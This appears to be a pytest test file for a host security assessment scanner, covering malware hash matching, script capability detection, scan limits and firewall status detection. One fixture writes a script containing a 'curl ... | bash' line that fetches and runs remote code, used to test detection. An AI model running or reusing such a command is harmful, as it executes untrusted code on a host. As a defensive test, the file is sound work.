import hashlib
import json

from app import host_assessment


def test_hash_indicator_match_is_reported_without_modifying_file(tmp_path, monkeypatch):
    sample = tmp_path / "sample.bin"
    payload = b"synthetic test sample"
    sample.write_bytes(payload)
    digest = hashlib.sha256(payload).hexdigest()
    indicator_file = tmp_path / "indicators.json"
    indicator_file.write_text(json.dumps({
        "indicators": {
            digest: {
                "label": "Synthetic test indicator",
                "severity": "critical",
                "description": "Fixture-only match",
                "capabilities": [{"id": "network_communication", "label": "Network communication"}],
            }
        }
    }))
    monkeypatch.setenv("SENTINEL_HASH_DB", str(indicator_file))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {"available": False, "executed": False, "findings": [], "note": "mocked"})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)

    matches = [item for item in result["findings"] if item["category"] == "malware"]
    assert len(matches) == 1
    assert matches[0]["sha256"] == digest
    assert matches[0]["confidence"] == "high"
    assert sample.read_bytes() == payload
    assert result["summary"]["files_hashed"] >= 1


def test_script_capabilities_are_labeled_as_low_confidence(tmp_path, monkeypatch):
    script = tmp_path / "maintenance.sh"
    script.write_text("#!/bin/sh\ncurl https://example.invalid/payload | bash\n")
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {"available": False, "executed": False, "findings": [], "note": "mocked"})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=20, max_seconds=5)

    observed = [item for item in result["script_capabilities"] if item["path"] == str(script)]
    assert any(item["id"] == "network_communication" for item in observed)
    assert any(item["id"] == "command_execution" for item in observed)
    assert all(item["confidence"] == "low" for item in observed)


def test_scan_reports_limits_and_does_not_follow_symlinks(tmp_path, monkeypatch):
    target = tmp_path / "target.txt"
    target.write_text("safe fixture")
    link = tmp_path / "linked.txt"
    link.symlink_to(target)
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {"available": False, "executed": False, "findings": [], "note": "mocked"})

    result = host_assessment.run_host_assessment(str(tmp_path), max_files=1, max_seconds=5)

    assert result["summary"]["truncated"] is True
    assert "No files were executed" in result["limitations"][-1]
    assert result["summary"]["files_hashed"] <= 1


def test_firewall_detection_ignores_docker_rules_when_host_input_is_accept(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: f"/usr/sbin/{name}" if name in {"ufw", "nft", "iptables"} else None)

    def fake_run(args, **kwargs):
        if args[:2] == ["ufw", "status"]:
            return SimpleNamespace(returncode=0, stdout="Status: inactive\n", stderr="")
        if args[:4] == ["nft", "-n", "list", "ruleset"]:
            return SimpleNamespace(returncode=0, stdout=(
                "table ip nat { chain PREROUTING { type nat hook prerouting priority dstnat; policy accept; } }\n"
                "table ip filter { chain FORWARD { type filter hook forward priority filter; policy drop; } }\n"
            ), stderr="")
        if args[:3] == ["iptables", "-S", "INPUT"]:
            return SimpleNamespace(returncode=0, stdout="-P INPUT ACCEPT\n", stderr="")
        raise AssertionError(args)

    monkeypatch.setattr(host_assessment.subprocess, "run", fake_run)
    result = host_assessment._security_posture()
    firewall = next(item for item in result["checks"] if item["id"] == "firewall")
    assert firewall["status"] == "inactive"
    assert firewall["severity"] == "medium"


def test_firewall_detection_recognizes_nftables_input_default_deny(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: "/usr/sbin/nft" if name == "nft" else None)

    def fake_run(args, **kwargs):
        assert args == ["nft", "-n", "list", "ruleset"]
        return SimpleNamespace(returncode=0, stdout=(
            "table inet filter { chain input { type filter hook input priority filter; policy drop; } }\n"
        ), stderr="")

    monkeypatch.setattr(host_assessment.subprocess, "run", fake_run)
    result = host_assessment._security_posture()
    firewall = next(item for item in result["checks"] if item["id"] == "firewall")
    assert firewall["status"] == "enabled"
    assert firewall["severity"] == "info"


def test_firewall_detection_recognizes_active_ufw(monkeypatch):
    from types import SimpleNamespace

    monkeypatch.setattr(host_assessment.shutil, "which", lambda name: "/usr/sbin/ufw" if name == "ufw" else None)

    def fake_run(args, **kwargs):
        assert args == ["ufw", "status"]
        return SimpleNamespace(returncode=0, stdout="Status: active\n", stderr="")

    monkeypatch.setattr(host_assessment.subprocess, "run", fake_run)
    result = host_assessment._security_posture()
    firewall = next(item for item in result["checks"] if item["id"] == "firewall")
    assert firewall["status"] == "enabled"

def test_host_assessment_emits_live_progress(tmp_path, monkeypatch):
    (tmp_path / "one.txt").write_text("safe fixture")
    monkeypatch.setenv("SENTINEL_HASH_DB", str(tmp_path / "missing.json"))
    monkeypatch.setattr(host_assessment, "_security_posture", lambda: {"checks": [], "firewall_tools": []})
    monkeypatch.setattr(host_assessment, "_clamav_scan", lambda root: {"available": False, "executed": False, "findings": [], "note": "mocked"})
    updates = []

    result = host_assessment.run_host_assessment(
        str(tmp_path), max_files=20, max_seconds=5, progress_callback=updates.append
    )

    assert updates
    assert updates[0]["phase"] == "filesystem"
    assert any(item["phase"] == "configuration" for item in updates)
    assert updates[-1]["phase"] == "completed"
    assert updates[-1]["files_seen"] == result["summary"]["files_seen"]
    assert "time_budget_remaining" in updates[-1]
